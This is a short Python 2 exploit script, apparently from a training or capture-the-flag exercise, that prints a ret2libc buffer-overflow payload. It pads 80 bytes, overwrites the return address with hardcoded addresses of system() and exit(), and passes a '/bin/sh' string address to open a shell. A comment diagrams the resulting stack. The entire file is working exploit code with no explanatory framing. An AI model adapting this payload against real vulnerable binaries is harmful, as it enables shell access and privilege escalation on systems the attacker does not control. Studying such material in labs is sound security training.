#!/usr/bin/env python2

import struct

bufferSize = 80
systemAddrs = 0xb7ecffb0
exitAddrs = 0xb7ec60c0
binSHStringAddrs = 0xb7fb63bf

buffer = "A" * bufferSize
retAddrs1 = struct.pack("I", systemAddrs)
retAddrs2 = struct.pack("I", exitAddrs)
firstCallParam = struct.pack("I", binSHStringAddrs)

# ----- STACK -----
# AAAAAAAAAAAAAAAAA
# AAAAAAAAAAAAAAAAA
# AAAAAAAAAAAAAAAAA
# AAAAAAAAAAAAAAAAA
# AAAAAAAAAAAAAAAAA
# -----------------
# EIP = systemAddrs
# exitAddrs
# binSHStringAddrs
# -----------------

print buffer + retAddrs1 + retAddrs2 + firstCallParam